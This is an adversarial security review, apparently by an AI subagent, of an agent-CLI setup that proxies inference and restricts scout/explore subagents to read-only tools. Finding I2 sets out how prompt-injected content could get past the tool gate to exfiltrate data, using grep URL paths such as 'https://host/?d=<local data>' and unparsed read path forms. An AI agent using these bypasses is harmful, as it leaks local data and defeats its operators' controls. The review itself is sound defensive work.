# Adversarial review: native OMP/OpenCode restoration delta (since 3b91b22)

Reviewer: Sonnet 5.5 (subagent). Read-only. No repo/index/HEAD edits, no live credentials or real home read,
no OMP run against a real home/network, no paid inference, no delegation, no build polling.
Branch `feat/pi-audited-capabilities`, worktree `framework-pi`. Official OMP source: `/nix/store/yalkwd8qj6ybb3mlkv6ama26i2h64prg-source` (v18.12.6).

Evidence tags used below:
- **[E]** executed by me: bounded synthetic Node/shell probes (no OMP, no network). Probe: `/tmp/opencode/omp-review-probe.mjs`.
- **[S]** read from the source of OMP v18.12.6 or this repo. This is not execution proof.
- **[H]** hypothesis or unverified inference. It needs a real run.

Not inferred: production WARP/project success, the real gateway's catalog/shape, the full 19-output build/eval result,
any real-Headroom behavior beyond the fake fixtures.

Files reviewed:
- `docs/superpowers/{specs,plans}/2026-10-22-omp-work-trial.md`, `docs/omp.md`, `/tmp/opencode/omp-work-progress.md`
- `modules/home-manager/omp.nix`, `dotfiles/omp/{provider-core.mjs,policy.mjs,work.ts}`
- `packages/headroom-pi.py`, `packages/headroom-service.py`
- `tests/omp/*`, `tests/headroom-omp.py`, `checks/omp.nix`
- diffs: `flake.nix`, `flake.lock`, `tuios.nix`, `zsh.nix`, `users/adriel-cachyos/default.nix`, `openspec-pi.nix`, `checks.nix`, `TODO.md`, `docs/pi.md`
- both design reports

## Verdict

**No Critical finding.** Against the stated hard goals I found nothing that demonstrates any of these:
- a direct (non-Headroom) inference path;
- a secret or project bearer in the store;
- shared Pi/OpenCode auth or DB state;
- a leaked proxy or lease on child disposal.

Those parts look sound by construction.

**Five Important findings.** I would fix these, or have you explicitly accept them, before calling the profile "work-ready".
1. I1: a real native API mismatch that rewrites the main system prompt on every turn. The wire test cannot see it.
2. I2: the "explore has no web / no internal routes" gate is bypassable through `grep` and through `read` path forms the policy does not parse.
3. I3: provider disabling is incomplete (implicit local providers stay enabled), and the gate and provider share one extension that OMP silently drops when its factory throws.
4. I4: the headline tests do not exercise the production wrapper, MCP service wrappers, `extensions` setting, MCP config or `models.yml`. Several claims in `docs/omp.md` are therefore source-derived, not certified.
5. I5 (source-derived hypothesis, not executed): every ordinary child session clears and re-registers the shared `llmplatform` provider with an empty model list. That can open a window with no models, which would deny parallel or follow-up spawns. The wire test spawns exactly one child.

Activation of the already-approved trial is your call.
- I1 and I2 are small, local fixes.
- Everything is fail-closed with respect to inference.
- I3 and I4 are residual risk and certification gaps, not demonstrated breaches.

---

## Critical

None.

## Important

### I1. `before_agent_start` collapses the native system-prompt array into a comma-joined string
- **Where:** `dotfiles/omp/work.ts:47-50`:
  ```ts
  return { systemPrompt: `${event.systemPrompt}\n\n${options.bootstrap ?? ""}` };
  ```
- **Contract [S]:**
  - `BeforeAgentStartEvent.systemPrompt` is `string[]` (`extensions/types.ts:1065-1072`).
  - `BeforeAgentStartEventResult.systemPrompt?: string[]` (`:1562-1566`).
  - `BuildSystemPromptResult.systemPrompt` is documented "Ordered system prompt blocks. Providers should preserve entries as distinct messages/blocks" (`system-prompt.ts:598`).
  - The runner accepts a bare string only by wrapping it in a one-element array (`runner.ts` `emitBeforeAgentStart`).
- **Effect [E]:** the template literal coerces the array with `join(",")`. `${["BLOCK_A","BLOCK_B"]}\n\nBOOT` becomes `"BLOCK_A,BLOCK_B\n\nBOOT"`.
  - Every main-session turn sends one merged block with stray commas between native blocks.
  - The block structure and cache segmentation the provider is told to preserve are lost.
  - The override is an opaque replacement per turn (`agent-session.ts:8283-8300`).
  - This contradicts `docs/omp.md:49-50` ("Native OMP visuals and system prompting are retained").
- **Why tests miss it:** `tests/omp/wire.py:133` passes `bootstrap: 'OMP_NATIVE_BOOTSTRAP'` but never asserts it appears in, or that the native prompt survives intact in, a proxied request body. The fake model replies `OMP_WIRE_OK` regardless.
- **Suggested fix:** `return { systemPrompt: [...event.systemPrompt, options.bootstrap] }`.
- **Suggested test:** capture the proxied Responses `instructions` or Chat system messages. Assert the bootstrap is present and the native blocks are unmodified. Assert the bootstrap is absent in the scout child's request.

### I2. Scout/explore read-only gate: web and internal-route restrictions are bypassable
`dotfiles/omp/policy.mjs:13-24`. All of this is source-derived plus my probe. I did not execute OMP.

**(a) `find`, `grep`, `glob` are allowed unconditionally (`policy.mjs:13`), with no argument validation.**
- `grep` materializes external URLs: `tools/grep.ts:576-585` (`materializeReadUrlToFile`), wired through `resolveToolSearchScope({ resolveExternalUrl })` at `:619`.
- `grep`, `glob` and `find` also resolve internal URL schemes through `InternalUrlFilesystem` (`grep.ts:566-570`, `glob.ts:221-227`).
- So explore, which `docs/omp.md` and `tests/omp/policy.mjs:17` say has no web, can fetch `https://…` with `grep path:"https://host/?d=<local data>"`.
- The `read` scheme denial can also be sidestepped by grepping `agent://`, `skill://`, `memory://` and similar.

**(b) `read` path parsing diverges from the native router [E].**
My probe reports **ALLOW** for explore, and for scout where a scheme should have been refused, on each of these:
- `www.example.com/x`: native `isReadableUrlPath` matches `/^www\./` (`tui/src/tools/read.ts:244-246`), so it is a URL fetch.
- `https:/example.com`: single slash. Native `^https?:\/\/?` matches.
- `src/a.ts;https://example.com` and `src/a.ts;xd://tool`: native `splitMixedUrlPathList` fans `;` lists into parts (`tools/path-utils.ts:761-783`, called at `tools/read.ts:1743-1749`).
- `custom:item` and `urn:example:doc`: native `extractUriScheme` accepts opaque URIs (`internal-urls/parse.ts:35-45`), which route to the MCP-resource fallback (`router.ts:229-237`, `282-300`). The policy regex requires `://`.
- `local:/x` and `/abs/local://x`: single-slash alias (`router.ts:200-217`). This is only the `local://` scratch, so it is lower risk.
- `a#b.png?q=describe`: the policy uses WHATWG `URL`, which puts `?q=` into the fragment and sees no `q`. Native `splitImageQuestionTarget` splits on the first `?` with `URLSearchParams.get("q")` (`tools/read.ts:787-803`) and finds `q`. I confirmed `policy-keys: []` against `native-q: "describe"`. Exploiting it needs an existing image file whose name contains `#`, so the practical risk is low.

- **Effect:**
  - The explore "local only, no web" and "no unknown read routes / no model-powered queries" properties are not enforced.
  - Prompt-injected file content can exfiltrate through URL paths or queries.
  - `docs/omp.md:61-63` already says this is not an exfiltration guarantee, but it states explore has no web.
- **Tests:** `tests/omp/policy.mjs:12-20` covers only canonical `https://…`, `agent://`, `?q=` and `xd://`.
- **Suggested approach:** invert the logic for explore/scout.
  - For `grep`, `find` and `glob`, reject any path argument that contains `://`, starts with `www.`/`http`, contains `;`, or matches `^[a-z][a-z0-9+.-]+:(?![0-9])`.
  - For `read`, apply the same shape test, and apply the `?q` check with the native split (`indexOf('?')` plus `URLSearchParams`), not WHATWG URL.
  - Add table-driven cases for every form above.
  - Optionally add a negative test through the real CLI.

### I3. Provider disabling is incomplete, and gating shares fate with the provider factory
**(a) Implicit local providers are not disabled.**
- `omp.nix:85-113` builds `disabledProviders` from `models.json` keys plus a hand list.
- OMP's implicit discovery registers `ollama`, `llama.cpp`, `lm-studio` (and `apple` on Darwin arm64) unless their ids are in the disabled set (`config/model-registry.ts:1635-1700`).
- None of those ids is a `models.json` key (printed list: `…ollama-cloud…local…web…`), and none is in the hand list. `local` is a key and is disabled.
- **Effect:**
  - At startup OMP probes `127.0.0.1:11434`, `:8080` and `:1234`.
  - If the inherited environment has `OLLAMA_HOST`/`OLLAMA_BASE_URL`/`LLAMA_CPP_BASE_URL`/`LM_STUDIO_BASE_URL` (`:1642-1700`), the endpoint can be an arbitrary host.
  - Their models become registry-selectable.
  - `enabledModels` scoping is not a provider allowlist, as your own design report says (§4 "`enabledProviders` alone is not a model-provider allowlist").
- **Test gap:** `tests/omp/config.mjs` does not assert these ids, and the wire fixture does not set such env.
- **Fix:** add `ollama`, `llama.cpp`, `lm-studio`, `apple` to `disabledProviders` and assert them.

**(b) The gate and provider share one extension that OMP drops silently on error.**
- `loader.ts:~440-458` `bindExtension` catches a thrown factory, returns `{ extension: null, error }`, and the session continues.
- `sdk.ts:2791-2808` only logs.
- `work.ts:12-13` registers the `tool_call` and `before_subagent_spawn` gates first, but a later throw (`acquire` failure in a re-exec, project RPC 403 or WARP-down at startup, `registerProvider` validation) discards the whole extension, handlers included.
- **Effect:** OMP starts with no llmplatform models and no scout/explore gate. With (a) unfixed, a reachable local provider could then run un-gated. [H] I did not verify which model OMP would select in that state.
- The wire test only covers a proxy killed after startup (`wire.py:169-179`). It does not cover a failed factory at startup.
- **Fix:**
  - Besides (a), consider splitting the gate into its own network-free extension, so it always loads.
  - Add a fixture where the project RPC returns 403 at startup. Assert no model request, no direct request, and that a spawned scout is still gated.

### I4. The headline tests certify less than `docs/omp.md:103-107` implies
`tests/omp/wire.py` is a strong and valuable test. It really executes the compiled CLI against fake endpoints, covers both APIs, default Sol/high, scout/low, write refusal, parent continuation and proxy death with no direct bypass. It deliberately deviates from production in these ways:

| Gap | Location | Consequence |
|---|---|---|
| `settings['extensions'] = []`, extension injected via `-e` with `--no-extensions` | `wire.py:110`, `:139` | The production path (settings `extensions = [entry]`, discovery of `~/.omp/agent/extensions/*.ts` incl. Tuios) is never loaded. Setting key and file shape verified only by me [S], not executed. |
| Scout frontmatter rewritten (`tools: [read, write]`, `blocking: true`) | `wire.py:117-119` | The production list `[read, find, grep, glob, web_search]`, the device-only `write` transport and async spawn are not executed. The gate is shown to refuse an extra tool, not to leave the production scout usable. |
| `mcp.json` written empty | `wire.py:112` | GitHub, Headroom, memory and Serena wrappers, the `!githubAuth` header command and `mcp__*` naming vs `READ_MCP` (`policy.mjs:1-7`) are never exercised under OMP. |
| `models.yml` not written | `wire.py` (absent) | The `providers.llmplatform.remoteCompaction` stanza (`omp.nix:354-356`) and its interaction with extension-registered rows are untested. Schema acceptance verified by me [S] (`models-config.ts:64-69`). |
| Raw `omp` is run; wrapper is not | `checks/omp.nix:13`, `wire.py:139` | The shell wrapper (`omp.nix:178-203`: PI-scope/profile refusal, `managed-work.json`, launcher lease) is never executed. The launcher-plus-factory double lease is untested. |
| `headroom-service.py`, `memoryCommand`, `serenaMcp`, `githubAuth` never executed | `omp.nix:204-238` | "Native MCP service wrappers acquire their own PID lease" rests on reading `headroom-service.py` (`acquire(os.getpid())` then `execvpe`, which keeps the PID). No test confirms the lease PID equals the exec'd MCP PID, or that `HEADROOM_OMP_MEMORY_DB`/`HEADROOM_PROXY_URL` reach the child. |
| Policy unit tests give `toolName: 'mcp__…'` directly | `policy.mjs:7-8,19` | See M1. |
| `config.mjs` asserts the Nix-evaluated values, not that OMP's loaders accept them | `config.mjs` | I checked every `settings` key against registry ids, and the `compat` field names against `catalog/src/types.ts` [S]. They exist. Nothing runs OMP's loaders over `mcp.json`, `models.yml`, `commands/` or the agent files in production form. |

Suggested additions, all small:
- A service-wrapper test with a fake command and fake proxy that asserts the lease PID and env.
- Run the wrapper once (`--version` and a fake `piCommand`) to cover its guards.
- A wire variant using the real, unmodified agents and `extensions` setting.
- `OMP_FIXTURE` MCP stub servers.

### I5. Per-child re-registration resets the shared provider to an empty catalog [S/H]
- **Where:** `dotfiles/omp/work.ts:40` calls `registerProvider("llmplatform", await service.providerConfig())`. `provider-core.mjs:91` returns `models: []` every time. The factory runs again in every child session.
- **Source path [S]:**
  - For a non-restricted session, `sdk.ts:2855-2866` runs `clearSourceRegistrations(sourceId)` for each active extension path and then re-registers.
  - `model-registry.ts:3392-3425` (`#clearRuntimeProviderState`, `clearSourceRegistrations`) drops `#runtimeDiscoveredModels` for non-credential-scoped providers.
  - The offline rehydrate (`sdk.ts:~2869-2876`) cannot restore header-bearing rows (`model-manager.ts:184-238`).
  - Non-UI sessions start an online refresh in the background (`sdk.ts:~2897`), so the registry is repopulated asynchronously. That is also one extra direct catalog GET per child.
  - Ordinary task children reuse the parent registry (`executor.ts:4393-4411`).
- **Effect [H]:**
  - A window with no `llmplatform` models in the shared registry.
  - A concurrent `spawnDecision` (`policy.mjs:34-36`, `modelRegistry.find`) in a parallel batch, or a follow-up spawn, could be denied with "Configured worker model is unavailable".
  - Title or compaction candidate resolution could see an empty provider.
  - It fails closed, so the harm is availability, not a bypass.
  - The parent's in-flight requests use an already-resolved `Model` object, which is why the single-child wire test passes.
- **Design intent not met:** the provider-transport design report (§Lifecycle) says "Child factories must register the current complete snapshot, not reset shared live models". The implementation never feeds `lastGood` into the registration.
- **Suggested test:** a parallel two-scout `task` batch plus a second sequential spawn in the same session. Assert no spawn denial and that discovery is not re-run per child. If the race is real, register the last-good snapshot in child factories, or skip re-registration when a provider with the same source and config exists.

## Minor

- **M1. `READ_MCP` allowlist is unreachable by the documented route.**
  - `tools.xdev` defaults to true (`tools/settings.ts:961-964`).
  - Scout/explore have explicit tool lists without `write`, so OMP grants a device-only `write` and mounts discoverable MCP/extension tools under `xd://` (`tools/index.ts:867-894`, `sdk.ts:4294-4313`, `xdev.ts:85-88`).
  - The advertised way to call them is `write xd://mcp__…`. The policy refuses every `write` (`policy.mjs:25`), so GitHub/Serena/headroom-memory search are effectively unavailable to workers.
  - The only path that would pass is incidental: the loop's direct-name device recovery (`sdk.ts:3836-3860`).
  - The user knows the xdev bridge is denied, but the positive MCP allowlist and its unit test (`policy.mjs:19`) imply worker MCP access. Either document "workers have no MCP" or test production behavior. Not a security issue. [S]

- **M2. `yield` is not allowed.**
  - Structured children (bundled scout has an `output:` schema, `task` with schema, eval `agent()` with schema) get `yield` added (`tools/index.ts:798-800`, `executor.ts:4246`).
  - The policy denies it (`policy.mjs:25`), so a structured scout/explore run cannot complete.
  - The user-level scout/explore are unstructured, so the default path is fine. [S]

- **M3. Empty `LLM_PLATFORM_PROJECT_ID` is rejected.**
  - `provider-core.mjs:83-84` tests `explicit !== undefined`, so `export LLM_PLATFORM_PROJECT_ID=` throws "Invalid …".
  - The design (§2) says "if nonempty". `work.ts:16` already normalizes `?? ""` for the cache key.
  - `tests/omp/provider.mjs` has no empty-string case. [S]

- **M4. Direct-gateway fetch hardening.**
  - `provider-core.mjs:61`: no `redirect: 'error'`. The Bearer header is sent on a possibly-redirected request.
  - `:68`: the 2 MB bound is checked after full buffering.
  - `:76-78`: transient retry has no backoff.
  - `:87`: nothing validates the response `id` shape beyond the regex.
  - Status classification is only `HTTP <n>`. The 401/403/WARP-HTML distinctions the design asked for (§2) are not implemented. [S]

- **M5. No recovery after owned-proxy death.**
  - `provider-core.mjs:95-98` memoizes the first transport. A dead proxy stays the model `baseUrl` until OMP restarts, and `/llmplatform refresh` (`work.ts:41-44`) does not re-acquire.
  - It fails closed, as designed. The design (§Lifecycle 4) preferred "clean reinitialization/rebinding".
  - The user sees native retries, not an actionable message. [S]

- **M6. Wrong product name in the helper error.** `headroom-pi.py:358` prints "Pi requires Headroom" for OMP failures. `work.ts:29` wraps it, so OMP users see the Pi name in some paths. Cosmetic.

- **M7. Vacuous assertion.** `wire.py:180-181` is `all(...)` over `summaries` with no `assert summaries`, so it passes if the summary trigger never fires. Bound the count, or document that it is a conditional check.

- **M8. Telemetry and update settings not pinned off.** [S]
  - `telemetry.otlpExportEnabled` defaults true (`telemetry-settings.ts:9-11`; used at `main.ts:2298`). It only acts if `OTEL_*` endpoints are in the environment.
  - `marketplace.autoUpdate` defaults `notify` (`modes/settings.ts:1140`). It only acts if marketplace plugins exist.
  - Both are inference/metadata egress beyond gateway+Headroom if the environment enables them. Consider pinning both off.

- **M9. Foreign discovery list is partial.**
  - `disabledProviders` covers claude, claude-plugins, codex, gemini, cursor, windsurf, github and opencode.
  - Capability providers `claude-md`, `cline`, `vscode`, `mcp-json`, `agents`, `agent-plugins`, `skillshare` and `ssh` (`discovery/*.ts`) remain.
  - Project `.mcp.json`, `.agents/` and similar are still read. The docs say project discovery remains, but they say "foreign OC discovery" only. [S]

- **M10. Extra spawnable agents.** `omp.nix:376-387` installs user agents `build` and `plan` with full tools. They are pinned by `before_subagent_spawn`, but they widen the delegate set beyond OpenCode's primary agents. Harmless, unrequested.

- **M11. Effort availability is not validated.**
  - `requiredModels` checks id presence only (`work.ts:21`, `provider-core.mjs:109-111`).
  - If the real catalog advertises fewer efforts than the roles request (Sonnet `xhigh`, Luna `off`), OMP clamps silently (`model-thinking.ts:43-88`, per the design report). [H] Needs the real catalog.

- **M12. Scout `web_search` is direct third-party egress.**
  - `modelRoles.web = web/duckduckgo` (`omp.nix:126`), with the web fallback chain emptied. Queries leave this machine to `html.duckduckgo.com`, not via gateway or Headroom.
  - This is intentional and `docs/omp.md` mentions `web_search`, but it does not name the third party. A user policy choice, so I decline to judge. [S]

## Verified OK (supports the Critical = none verdict)

- **Provider/auth API match.**
  - `registerProvider(name, config)` two-arg, with `models: []`, `fetchDynamicModels`, per-row `api`, `thinking`, `headers` and `compat`, matches `extensions/types.ts:1920-2050`. Compat field names exist in `catalog/src/types.ts`.
  - Literal `apiKey: "project/<id>"` is installed as a runtime key (`model-registry.ts:3537-3546`).
  - Per-child re-registration uses the same `sourceId` (the extension path), so there is no source handoff (`:3495-3524`). The clear-and-re-register behavior is the separate concern in I5.
  - The cached header-less rows are treated unresolved and refetched, never used with a stale proxy port (`model-manager.ts:184-238`, `model-cache.ts:624-637`).
- **Proxy ownership and lifetime.**
  - `acquire(pid)` validates a live same-user PID and start identity, and uses a deterministic uuid5 lease token, so it is idempotent. The lease is never unlinked by session hooks. Owner exit prunes it.
  - The OMP namespace is `headroom-omp-<uid>`; the Pi namespace and signature are unchanged for Pi (config has no `client` key).
  - `headroom-service.py` execs with the same PID, so the lease follows the MCP process.
  - Inference rows carry `baseUrl = owned proxy` plus `x-headroom-*` headers. Discovery and RPC use direct fetch to a Nix-fixed HTTPS root origin. Loopback is test-only (`allowTestLoopback`, never passed from Nix).
- **No secret in store.**
  - `githubAuth` reads `$CODEX_GITHUB_PERSONAL_ACCESS_TOKEN` or the sops runtime path at execution (`omp.nix:231-238`); `mcp.json` holds only `!<store script>`.
  - The manifest, entry and bootstrap hold public data only.
  - Project/identity is resolved at runtime and never written.
- **Spawn pinning.** `before_subagent_spawn` (`structured-subagent.ts:492-521`, `runner.ts:2291-2321`) pins `{model}` or blocks. The preflight uses `modelRegistry.find/getApiKey`, which exist. Gating is by `ctx.agent.name`, so a project-supplied `scout.md` cannot widen the gate.
- **Settings.** Every key in `omp.nix` settings is a registered setting id [E, grep against source]. The extension handler return shapes (`ToolCallEventResult`, `BeforeSubagentSpawnEventResult`) match.
- **Lock hygiene.** All 37 previously locked input paths resolve to identical `narHash`es in the new `flake.lock`. The only new subtree is `/omp`, and its sub-inputs are as TODO.md documents [E].
- **Razer.** `oc` was already `headroom wrap opencode` when Pi is off, so Razer is unchanged. OMP is not enabled for Razer (`config.mjs:6`).

## Declined to judge / needs real runs

- Real WARP/GetOrCreateUserProject response shape (`{id}` assumed), real catalog fields, and which effort sets Sol/Luna/Sonnet really advertise.
- Whether the real gateway accepts `developer` role and `max_completion_tokens` for Sonnet over Chat (`provider-core.mjs:37-40`).
- Serena flags `--context agent --agent-interface tools` (runtime `uvx`), and MCP connect timeouts on a cold `uvx`.
- Interactive TUI default-model resolution timing (the wire test is `--print` only).
- Whether untrusted project config (`.omp/`, project agents, `mcp.json`) can override managed routing. That is a workspace-trust question, not Nix.
- Unrequested-egress policy for scout `web_search` and the OTLP/marketplace defaults (M8, M12).
- Hostile-code isolation: the docs correctly disclaim OS isolation, and I agree this is not a sandbox.

## Residual claims I would not repeat
- Do not claim that omp-wire proves the production wrapper, MCP stack or `extensions` loading. See I4.
- Do not claim that explore "cannot use web" until I2 is closed.
- Do not claim "native system prompting is retained" until I1 is fixed and asserted.
